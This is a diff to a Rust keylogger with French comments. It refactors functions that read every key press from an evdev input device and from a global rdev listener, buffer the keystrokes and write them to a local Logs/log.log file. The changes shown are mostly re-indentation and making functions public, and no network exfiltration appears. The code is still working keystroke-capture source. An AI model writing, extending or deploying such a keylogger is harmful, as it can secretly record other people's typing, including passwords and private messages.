@@ -2,13 +2,12 @@ use evdev::{Device, InputEventKind, Key};
 use rdev::{listen, Event, EventType};
 use std::fs::OpenOptions;
 use std::io::Write;
-use std::path::{Path, PathBuf};
 use std::sync::{Arc, Mutex};
 use std::thread;
 use std::time::Duration;
 
 /// 📁 Écrit les frappes dans Logs/log.log à la racine du projet
-fn write_plain_log(data: &str) {
+pub fn write_plain_log(data: &str) {
     let log_path = std::env::current_exe()
         .expect("❌ Impossible d'obtenir le chemin de l'exécutable")
         .parent().unwrap()
@@ -81,35 +80,35 @@ pub fn start_keylogger(device_path: &str, _passphrase: &str) {
         thread::sleep(Duration::from_secs(5));
         let mut buf = buffer_clone.lock().unwrap();
         if !buf.is_empty() {
-            println!("💾 Sauvegarde des frappes dans le fichier log...");
+            println!("💾 Sauvegarde des frappes dans log.log...");
             write_plain_log(&buf);
             buf.clear();
         }
     });
 
     // 🎧 Thread principal : écoute les touches
-loop {
-    if let Ok(events) = dev.fetch_events() {
-        for ev in events {
-            if let InputEventKind::Key(key) = ev.kind() {
-                if ev.value() == 1 {
-                    println!("⌨️ Touche détectée : {:?}", key);
-                    let key_str = format!("{:?} ", key);
+    loop {
+        if let Ok(events) = dev.fetch_events() {
+            for ev in events {
+                if let InputEventKind::Key(key) = ev.kind() {
+                    if ev.value() == 1 {
+                        println!("⌨️ Touche détectée : {:?}", key);
+                        let key_str = format!("{:?} ", key);
 
-                    {
-                        let mut buf = buffer.lock().unwrap();
-                        buf.push_str(&key_str);
+                        {
+                            let mut buf = buffer.lock().unwrap();
+                            buf.push_str(&key_str);
+                        }
+
+                        // 🛠️ Écrire immédiatement dans log.log
+                        write_plain_log(&key_str);
                     }
-
-                    // 🛠️ Ajout : écrire immédiatement dans log.log
-                    write_plain_log(&key_str);
                 }
             }
         }
-    }
 
-    thread::sleep(Duration::from_millis(10));
-}
+        thread::sleep(Duration::from_millis(10));
+    }
 }
 
 /// 🚀 Lance le keylogger global (basé sur rdev)
@@ -122,7 +121,7 @@ pub fn start_rdev_logger() {
 }
 
 /// 📋 Callback utilisé par rdev pour chaque touche
-fn callback(event: Event) {
+pub fn callback(event: Event) {
     if let EventType::KeyPress(key) = event.event_type {
         let key_str = format!("{:?}", key);
 
